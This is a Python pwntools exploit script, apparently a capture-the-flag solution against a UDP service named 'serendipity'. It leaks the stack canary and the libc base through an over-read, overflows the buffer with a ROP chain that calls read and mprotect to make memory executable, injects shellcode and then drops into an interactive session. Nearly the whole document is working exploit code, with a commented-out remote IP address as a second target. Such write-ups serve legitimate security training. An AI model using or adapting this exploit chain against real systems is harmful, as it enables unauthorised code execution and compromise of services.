from pwn import *

AUTH = 0x201
DARK = 0x301

io = remote("localhost", 9981, typ="udp")
# io = remote("157.245.147.89", 23913, typ="udp")

libc = ELF("./libc.so.6")
context.binary = ELF("./serendipity")


def add_session(io, op: int, size):
    io.send(
        (p32(0x70303070)+p32(op) +
         p32(size)+p16(16)+b"XXX\0")
    )
    io.recvuntil(b'auth successfully\n', timeout=1)
    return u64(io.recv(8))


magik0 = add_session(io, AUTH, 0x30)

x = p64(magik0)+p32(0)+p16(0x30b) + \
    (b"moonlit_embrace\0").ljust(0x30b, b'A')
io.send(x)
io.recv(0x109)

canary = u64(b"\0"+io.recv(7))
log.success(f"canary: {hex(canary)}")

x = p64(magik0)+p32(0)+p16(0x30a+8+8) + \
    (b"moonlit_embrace\0").ljust(0x30a+8+8, b'A')
io.send(x)
io.recv(0x118)

libc.address = u64(io.recv(6)+b"\0\0") - 0x6cac3-0x28000
log.success(f"libc @ {hex(libc.address)}")


rdi_ret = libc.address+0x000000000002a3e5
rsi_ret = libc.address+0x000000000002be51
rdx_ret = libc.address+0x00000000000796a2

shellcode = asm(f"""
push rax
push rax
lea rbx, [rsp+0x28]
mov rbx, [rbx]
lea rbx, [rbx+0xa0]
mov rbx, [rbx]
sub rbx, 0x2a49
add rbx, 0x4000

mov rdi, rbx
mov rsi, 0x3000
mov rdx, 7
mov eax,0x9
add eax,1
syscall

add rbx, 0x2c
mov rcx, 0x2f2f2f2f2f2f2f2f
mov qword ptr [rbx],rcx

jmp $
""")

start_ = (libc.sym.__malloc_hook+8+4+2) & ~0xfff

rop = (
    p64(rdi_ret)+p64(3) +
    p64(rsi_ret)+p64(start_) +
    p64(rdx_ret)+p64(0x100) +
    p64(libc.sym.read) +

    p64(rdi_ret)+p64(start_) +
    p64(rsi_ret)+p64(0x3000) +
    p64(rdx_ret)+p64(7) +
    p64(libc.sym.mprotect) +

    p64((start_+8+4+2))
)


pause()
x = p64(magik0)+p32(0)+p16(0x30a+8+8+len(rop)) + \
    (b"..\0").ljust(0x30a, b'C')+p64(canary)+p64(0)+rop
io.send(x)

x = p64(magik0)+p32(0)+p16(len(shellcode)+0x30) + \
    shellcode
io.send(x)
print(io.recv())

magik1 = add_session(io, AUTH, 0x30)
x = p64(magik1)+p32(0)+p16(0x10) + \
    b"./flag\0"
pause()
io.send(x)


io.interactive()